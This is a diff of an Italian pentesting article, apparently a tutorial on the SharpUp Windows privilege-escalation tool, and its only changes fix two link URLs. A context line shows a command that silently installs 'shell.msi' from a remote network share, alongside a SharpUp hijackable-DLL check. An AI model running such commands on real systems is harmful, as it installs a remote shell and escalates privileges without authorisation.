@@ -232,7 +232,7 @@ msiexec /quiet /qn /i \\192.168.1.50\share\shell.msi
 
 ## 4️⃣ Tecniche Avanzate
 
-### Hijackable [DLLs](https://hackita.it/articoli/ldap)
+### Hijackable [DLLs](https://hackita.it/articoli/porta-389-ldap/)
 
 ```cmd
 SharpUp.exe HijackableDLLs
@@ -677,7 +677,7 @@ No, la maggior parte dei check funziona come user. L'exploitation potrebbe richi
 
 **SharpUp trova tutte le PrivEsc?**
 
-No, è focalizzato su misconfiguration comuni. Usa insieme a [WinPEAS](https://hackita.it/articoli/winpeas) per coverage completa.
+No, è focalizzato su misconfiguration comuni. Usa insieme a [WinPEAS](https://hackita.it/articoli/winpeas/) per coverage completa.
 
 **Come verifico se un vettore è exploitabile?**
 
